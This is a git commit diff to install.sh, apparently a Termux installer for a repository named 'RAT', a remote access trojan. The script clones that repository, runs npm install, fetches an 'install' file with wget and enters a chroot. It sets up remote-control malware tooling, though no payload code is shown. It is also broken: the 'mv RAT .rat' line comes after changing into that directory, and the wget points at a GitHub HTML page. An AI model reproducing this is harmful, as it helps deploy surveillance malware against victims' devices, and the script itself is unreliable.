fcdc99f75976f5722bd9bb605e25766033f39c58
IrisYoutuber <78909129+IrisYoutuber@users.noreply.github.com>
2021-02-11 20:52:30 +0530

    Add files via upload

--- install.sh
+++ install.sh
@@ -6,6 +6,8 @@ pkg install proot
 
 cd $HOME
 git clone https://github.com/IrisYoutuber/RAT.git
+cd RAT
+npm install
 mv RAT .rat
 wget https://github.com/IrisYoutuber/RAT/blob/master/app/factory/decompiled/build/apk/install
 termux-chroot
